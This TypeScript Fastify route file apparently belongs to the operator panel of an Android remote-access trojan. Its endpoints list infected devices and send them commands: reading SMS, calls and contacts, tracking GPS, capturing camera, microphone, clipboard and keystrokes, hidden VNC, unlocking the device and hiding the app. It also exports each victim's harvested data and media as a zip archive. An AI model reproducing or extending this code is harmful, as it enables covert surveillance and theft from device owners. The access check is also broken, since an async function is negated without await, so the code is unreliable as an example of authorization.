import type { FastifyInstance } from 'fastify';
import { getDb, dbHelpers } from '../db/index.js';
import { clients, clientFiles, user as userTable } from '../db/schema.js';
import type { clients as ClientsTable } from '../db/schema.js';
import { eq, desc, and } from 'drizzle-orm';
import AdmZip from 'adm-zip';
import { socketService } from '../services/socket.js';
import { CMD, type CmdType } from '../types/index.js';
import { normalizePermissions, normalizeDeviceInfo, normalizeFileList } from '../utils/helpers.js';
import { requirePermission, getRequestUser } from '../middleware/auth.js';
import type { Permission } from '../types/index.js';
import { log } from '../utils/logger.js';

const PAGE_PERMISSIONS: Record<string, Permission> = {
  info: 'device:view',
  sms: 'device:sms',
  calls: 'device:calls',
  contacts: 'device:contacts',
  gps: 'device:gps',
  camera: 'device:camera',
  mic: 'device:mic',
  files: 'device:files',
  wifi: 'device:wifi',
  clipboard: 'device:clipboard',
  notifications: 'device:notifications',
  permissions: 'device:permissions',
  apps: 'device:apps',
  fason: 'device:fason',
  spork: 'device:spork',
  hvnc: 'device:hvnc',
  inspector: 'device:inspector',
  keylogger: 'device:keylogger',
  unlock: 'device:unlock',
  downloads: 'files:download',
};

const CMD_PERMISSIONS: Partial<Record<CmdType, Permission>> = {
  [CMD.SMS]: 'device:sms',
  [CMD.CALLS]: 'device:calls',
  [CMD.CONTACTS]: 'device:contacts',
  [CMD.LOCATION]: 'device:gps',
  [CMD.CAMERA]: 'device:camera',
  [CMD.MIC]: 'device:mic',
  [CMD.FILES]: 'device:files',
  [CMD.WIFI]: 'device:wifi',
  [CMD.CLIPBOARD]: 'device:clipboard',
  [CMD.NOTIFICATIONS]: 'device:notifications',
  [CMD.PERMISSIONS]: 'device:permissions',
  [CMD.PERM_CHECK]: 'device:permissions',
  [CMD.APPS]: 'device:apps',
  [CMD.FASON]: 'device:fason',
  [CMD.INFO]: 'device:view',
  [CMD.HVNC]: 'device:hvnc',
  [CMD.INSPECTOR]: 'device:inspector',
  [CMD.KEYLOGGER]: 'device:keylogger',
  [CMD.SMS_PUSH]: 'device:sms',
  [CMD.DEVICE_UNLOCK]: 'device:unlock',
};

export async function deviceRoutes(app: FastifyInstance) {
  app.get('/api/clients', {
    preHandler: [app.auth, requirePermission('device:view')],
  }, async (request) => {
    const user = getRequestUser(request);
    const d = getDb();
    let allClients;
    if (user.role === 'admin') {
      allClients = (await d.select().from(clients).orderBy(desc(clients.online), desc(clients.lastSeen)));
    } else {
      allClients = (await d.select().from(clients).where(eq(clients.ownerId, user.userId)).orderBy(desc(clients.online), desc(clients.lastSeen)));
    }
    const formatted = allClients.map(formatClient);
    return {
      success: true,
      data: {
        clients: formatted,
        online: formatted.filter(c => c.online).length,
        offline: formatted.filter(c => !c.online).length,
        total: formatted.length,
      },
    };
  });

  app.get('/api/client/:id', {
    preHandler: [app.auth, requirePermission('device:view')],
  }, async (request, reply) => {
    const { id } = request.params as { id: string };

    const user = getRequestUser(request);
    if (!canAccessDevice(user, id)) {
      return reply.code(403).send({ success: false, error: 'You do not have access to this device' });
    }
    const d = getDb();
    const client = (await d.select().from(clients).where(eq(clients.id, id)).limit(1))[0];
    if (!client) {
      return reply.code(404).send({ success: false, error: 'Client not found' });
    }
    return { success: true, data: formatClient(client) };
  });

  app.get('/api/client/:id/:page', {
    preHandler: [app.auth],
  }, async (request, reply) => {
    const { id, page } = request.params as { id: string; page: string };

    const user = getRequestUser(request);
    if (!canAccessDevice(user, id)) {
      return reply.code(403).send({ success: false, error: 'You do not have access to this device' });
    }
    const requiredPermission = PAGE_PERMISSIONS[page];
    if (!requiredPermission) {
      return reply.code(400).send({ success: false, error: `Unknown page: ${page}` });
    }
    if (!user?.permissions || !user.permissions.includes(requiredPermission)) {
      return reply.code(403).send({ success: false, error: 'Insufficient permissions' });
    }
    const d = getDb();
    const client = (await d.select().from(clients).where(eq(clients.id, id)).limit(1))[0];
    if (!client) {
      return reply.code(404).send({ success: false, error: 'Client not found' });
    }
    const data = await getPageData(id, page, client);
    return { success: true, data };
  });

  app.delete('/api/client/:id', {
    preHandler: [app.auth, requirePermission('device:delete')],
  }, async (request, reply) => {
    const { id } = request.params as { id: string };

    const user = getRequestUser(request);
    if (!canAccessDevice(user, id)) {
      return reply.code(403).send({ success: false, error: 'You do not have access to this device' });
    }
    const d = getDb();
    const existing = (await d.select({ id: clients.id }).from(clients).where(eq(clients.id, id)).limit(1))[0];
    if (!existing) {
      return reply.code(404).send({ success: false, error: 'Client not found' });
    }
    socketService.disconnectClient(id);
    socketService.setGps(id, 0);
    await d.delete(clients).where(eq(clients.id, id));
    (await dbHelpers.addLog('INFO', 'CLIENT', `Client ${id} deleted`));
    return { success: true, message: 'Client deleted' };
  });

  app.get('/api/client/:id/export', {
    preHandler: [app.auth, requirePermission('device:view'), requirePermission('files:download')],
  }, async (request, reply) => {
    const { id } = request.params as { id: string };

    const user = getRequestUser(request);
    const d = getDb();
    if (!canAccessDevice(user, id)) {
      return reply.code(403).send({ success: false, error: 'You do not have access to this device' });
    }
    const client = (await d.select().from(clients).where(eq(clients.id, id)).limit(1))[0];
    if (!client) {
      return reply.code(404).send({ success: false, error: 'Client not found' });
    }
    try {
      const zip = new AdmZip();
      const folderName = `spork-data-${id}`;
      const deviceInfo = client.deviceInfo ? safeJsonParse(client.deviceInfo, null) : null;
      const infoPayload = {
        ...formatClient(client),
        deviceInfo: deviceInfo ? normalizeDeviceInfo(deviceInfo) : null,
        exportedAt: new Date().toISOString(),
      };
      zip.addFile(`${folderName}/device-info.json`, Buffer.from(JSON.stringify(infoPayload, null, 2), 'utf-8'));
      const dataTypes = [
        'sms', 'calls', 'contacts', 'gps', 'wifi', 'wifi_error', 'clipboard',
        'notifications', 'permissions', 'apps', 'files', 'file_error',
        'cameras', 'mic_status', 'notification_status',
      ];
      for (const dt of dataTypes) {
        const raw = (await dbHelpers.getOrCreateClientData(id, dt));
        let parsed: unknown = safeJsonParse(raw, []);
        if (dt === 'permissions' && Array.isArray(parsed)) {
          parsed = normalizePermissions(parsed);
        }
        if (dt === 'files' && Array.isArray(parsed)) {
          parsed = normalizeFileList(parsed);
        }
        zip.addFile(`${folderName}/${dt}.json`, Buffer.from(JSON.stringify(parsed, null, 2), 'utf-8'));
      }
      const fileTypeMap: Record<string, string> = {
        photo: 'photos',
        video: 'videos',
        recording: 'recordings',
        download: 'downloads',
        upload: 'uploads',
      };

      const allFiles = (await d.select().from(clientFiles).where(eq(clientFiles.clientId, id)));
      for (const file of allFiles) {
        const subfolder = fileTypeMap[file.fileType] || 'other';
        const safeName = (file.originalName || `file_${file.id}`).replace(/[\/\\]/g, '_');
        const data = file.data as Buffer;
        if (data && data.length > 0) {
          zip.addFile(`${folderName}/${subfolder}/${file.id}_${safeName}`, Buffer.from(data));
        }
      }
      const fileIndex = allFiles.map(f => ({
        id: f.id,
        fileType: f.fileType,
        originalName: f.originalName,
        mimeType: f.mimeType,
        fileSize: f.fileSize,
        createdAt: f.createdAt,
        path: `${fileTypeMap[f.fileType] || 'other'}/${f.id}_${(f.originalName || '').replace(/[\/\\]/g, '_')}`,
      }));
      zip.addFile(`${folderName}/file-index.json`, Buffer.from(JSON.stringify(fileIndex, null, 2), 'utf-8'));
      const zipBuffer = zip.toBuffer();
      (await dbHelpers.addLog('DATA', 'EXPORT', `Exported all data for ${id}`, JSON.stringify({ files: allFiles.length, size: zipBuffer.length })));
      const safeId = id.replace(/[^a-zA-Z0-9_-]/g, '_');
      reply.header('Content-Type', 'application/zip');
      reply.header('Content-Disposition', `attachment; filename="spork-data-${safeId}.zip"`);
      reply.header('Content-Length', zipBuffer.length);
      return reply.send(zipBuffer);
    } catch (err: any) {
      log.error(`Export failed: ${id}: ${err.message}`);
      return reply.code(500).send({ success: false, error: 'Failed to export device data' });
    }
  });

  app.post('/api/cmd/:id/:cmd', {
    preHandler: [app.auth, requirePermission('device:command')],
  }, async (request, reply) => {
    const { id, cmd } = request.params as { id: string; cmd: string };

    const params = (request.body || {}) as Record<string, unknown>;
    const user = getRequestUser(request);
    if (!canAccessDevice(user, id)) {
      return reply.code(403).send({ success: false, error: 'You do not have access to this device' });
    }
    const cmdType = cmd as CmdType;
    if (!Object.values(CMD).includes(cmdType)) {
      return reply.code(400).send({ success: false, error: 'Invalid command' });
    }
    const requiredPerm = CMD_PERMISSIONS[cmdType];
    if (requiredPerm) {
      if (!user?.permissions || !user.permissions.includes(requiredPerm)) {
        return reply.code(403).send({ success: false, error: `Insufficient permissions for this command (requires ${requiredPerm})` });
      }
    }
    const d = getDb();
    const client = (await d.select({ id: clients.id }).from(clients).where(eq(clients.id, id)).limit(1))[0];
    if (!client) {
      return reply.code(404).send({ success: false, error: 'Client not found' });
    }
    const result = await socketService.send(id, cmdType, params);
    return { success: true, sent: result.sent, queued: !result.sent, commandId: result.commandId };
  });

  app.post('/api/gps/:id/:interval', {
    preHandler: [app.auth, requirePermission('device:gps')],
  }, async (request, reply) => {
    const { id, interval } = request.params as { id: string; interval: string };

    const intervalNum = parseInt(interval, 10);
    const user = getRequestUser(request);
    if (!canAccessDevice(user, id)) {
      return reply.code(403).send({ success: false, error: 'You do not have access to this device' });
    }
    if (isNaN(intervalNum) || intervalNum < 0 || intervalNum > 3600) {
      return reply.code(400).send({ success: false, error: 'Interval must be between 0 and 3600 seconds' });
    }
    const d = getDb();
    const client = (await d.select({ id: clients.id }).from(clients).where(eq(clients.id, id)).limit(1))[0];
    if (!client) {
      return reply.code(404).send({ success: false, error: 'Client not found' });
    }
    socketService.setGps(id, intervalNum);
    return { success: true, interval: intervalNum };
  });

  app.put('/api/client/:id/assign', {
    preHandler: [app.auth, requirePermission('users:manage')],
  }, async (request, reply) => {
    const { id } = request.params as { id: string };

    const { ownerId } = (request.body || {}) as { ownerId?: string };

    const user = getRequestUser(request);
    if (!ownerId) {
      return reply.code(400).send({ success: false, error: 'ownerId is required' });
    }
    if (user.role !== 'admin' && !canAccessDevice(user, id)) {
      return reply.code(403).send({ success: false, error: 'You can only manage your own devices' });
    }
    const d = getDb();
    const targetUser = (await d.select({ id: userTable.id }).from(userTable).where(eq(userTable.id, ownerId)).limit(1))[0];
    if (!targetUser) {
      return reply.code(400).send({ success: false, error: 'Target user does not exist' });
    }
    const client = (await d.select({ id: clients.id }).from(clients).where(eq(clients.id, id)).limit(1))[0];
    if (!client) {
      return reply.code(404).send({ success: false, error: 'Client not found' });
    }
    (await dbHelpers.assignDevice(id, ownerId));
    socketService.invalidateDeviceOwner(id);
    (await dbHelpers.addLog('ADMIN', 'DEVICE', `Device ${id} assigned to user ${ownerId}`));
    return { success: true, message: 'Device assigned' };
  });

  app.put('/api/client/:id/unassign', {
    preHandler: [app.auth, requirePermission('users:manage')],
  }, async (request, reply) => {
    const { id } = request.params as { id: string };

    const user = getRequestUser(request);
    if (user.role !== 'admin' && !canAccessDevice(user, id)) {
      return reply.code(403).send({ success: false, error: 'You can only manage your own devices' });
    }
    const d = getDb();
    const client = (await d.select({ id: clients.id }).from(clients).where(eq(clients.id, id)).limit(1))[0];
    if (!client) {
      return reply.code(404).send({ success: false, error: 'Client not found' });
    }
    (await dbHelpers.unassignDevice(id));
    socketService.invalidateDeviceOwner(id);
    (await dbHelpers.addLog('ADMIN', 'DEVICE', `Device ${id} unassigned`));
    return { success: true, message: 'Device unassigned' };
  });
}

function safeJsonParse(str: string, fallback: any = []): any {
  try { return JSON.parse(str); } catch { return fallback; }
}

async function getPageData(id: string, page: string, client: any) {
  switch (page) {
    case 'info': {
      const rawInfo = client.deviceInfo ? safeJsonParse(client.deviceInfo, null) : null;
      const deviceInfo = rawInfo ? normalizeDeviceInfo(rawInfo) : null;
      return { client: formatClient(client), deviceInfo };
    }
    case 'sms': {
      const smsData = safeJsonParse((await dbHelpers.getOrCreateClientData(id, 'sms')));
      return { list: Array.isArray(smsData) ? smsData : [] };
    }
    case 'calls': {
      const callsData = safeJsonParse((await dbHelpers.getOrCreateClientData(id, 'calls')));
      return { list: Array.isArray(callsData) ? callsData : [] };
    }
    case 'contacts': {
      const contactsData = safeJsonParse((await dbHelpers.getOrCreateClientData(id, 'contacts')));
      return { list: Array.isArray(contactsData) ? contactsData : [] };
    }
    case 'wifi': {
      const wifiData = safeJsonParse((await dbHelpers.getOrCreateClientData(id, 'wifi')));
      const wifiErrorData = safeJsonParse((await dbHelpers.getOrCreateClientData(id, 'wifi_error')), null);
      return {
        list: Array.isArray(wifiData) ? wifiData : [],
        error: wifiErrorData?.error || (wifiData?.error as string) || null,
      };
    }
    case 'clipboard': {
      const clipData = safeJsonParse((await dbHelpers.getOrCreateClientData(id, 'clipboard')));
      return { list: Array.isArray(clipData) ? clipData : [] };
    }
    case 'notifications': {
      const notifData = safeJsonParse((await dbHelpers.getOrCreateClientData(id, 'notifications')));
      const notifStatus = safeJsonParse((await dbHelpers.getOrCreateClientData(id, 'notification_status')), null);
      return {
        list: Array.isArray(notifData) ? notifData : [],
        status: notifStatus || null,
      };
    }
    case 'permissions': {
      const rawPerms = safeJsonParse((await dbHelpers.getOrCreateClientData(id, 'permissions')));
      return { list: normalizePermissions(rawPerms) };
    }
    case 'apps': {
      const appsData = safeJsonParse((await dbHelpers.getOrCreateClientData(id, 'apps')));
      return { list: Array.isArray(appsData) ? appsData : [] };
    }
    case 'gps': {
      const gpsData = safeJsonParse((await dbHelpers.getOrCreateClientData(id, 'gps')));
      return {
        list: Array.isArray(gpsData) ? gpsData : [],
        interval: client.gpsInterval,
      };
    }
    case 'files': {
      const rawFiles = safeJsonParse((await dbHelpers.getOrCreateClientData(id, 'files')));
      const fileList = Array.isArray(rawFiles) ? normalizeFileList(rawFiles) : [];
      const fileError = safeJsonParse((await dbHelpers.getOrCreateClientData(id, 'file_error')), null);
      return { list: fileList, path: client.currentPath, error: fileError?.error || null };
    }
    case 'downloads': {
      const downloads = (await dbHelpers.getClientFiles(id, 'download'));
      const uploads = (await dbHelpers.getClientFiles(id, 'upload'));
      return { list: [...downloads, ...uploads] };
    }
    case 'camera': {
      const rawCameras = (await dbHelpers.getOrCreateClientData(id, 'cameras'));
      const cameras = safeJsonParse(rawCameras);
      const photos = (await dbHelpers.getClientFiles(id, 'photo'));
      const videos = (await dbHelpers.getClientFiles(id, 'video'));
      const camerasDetected = rawCameras !== '[]';
      return { cameras: cameras || [], photos, videos, permission: camerasDetected ? client.cameraPermission : null };
    }
    case 'mic': {
      const recordings = (await dbHelpers.getClientFiles(id, 'recording'));
      const micStatus = safeJsonParse((await dbHelpers.getOrCreateClientData(id, 'mic_status')));
      return { list: recordings, status: micStatus || null };
    }
    case 'fason':
      return { hidden: client.fasonHidden };
    case 'keylogger': {
      return {};
    }
    case 'unlock': {
      return {};
    }
    case 'hvnc': {
      return {};
    }
    case 'inspector': {
      return {};
    }
    case 'spork': {
      const sporkData = safeJsonParse((await dbHelpers.getOrCreateClientData(id, 'spork')));
      return { hidden: sporkData?.hidden || false };
    }
    default:
      return { client: formatClient(client) };
  }
}

type ClientRow = typeof ClientsTable.$inferSelect;
export function formatClient(client: ClientRow) {
  return {
    id: client.id,
    ownerId: client.ownerId,
    ip: client.ip,
    country: client.country,
    city: client.city,
    timezone: client.timezone,
    deviceModel: client.deviceModel,
    deviceBrand: client.deviceBrand,
    deviceVersion: client.deviceVersion,
    online: !!client.online,
    firstSeen: client.firstSeen,
    lastSeen: client.lastSeen,
    reconnectCount: client.reconnectCount,
    fasonHidden: !!client.fasonHidden,
    cameraPermission: !!client.cameraPermission,
    currentPath: client.currentPath,
    gpsInterval: client.gpsInterval,
  };
}

async function canAccessDevice(user: { userId: string; role: string }, clientId: string): Promise<boolean> {
  if (user.role === 'admin') return true;
  const ownerId = (await dbHelpers.getDeviceOwnerId(clientId));
  return ownerId === user.userId;
}
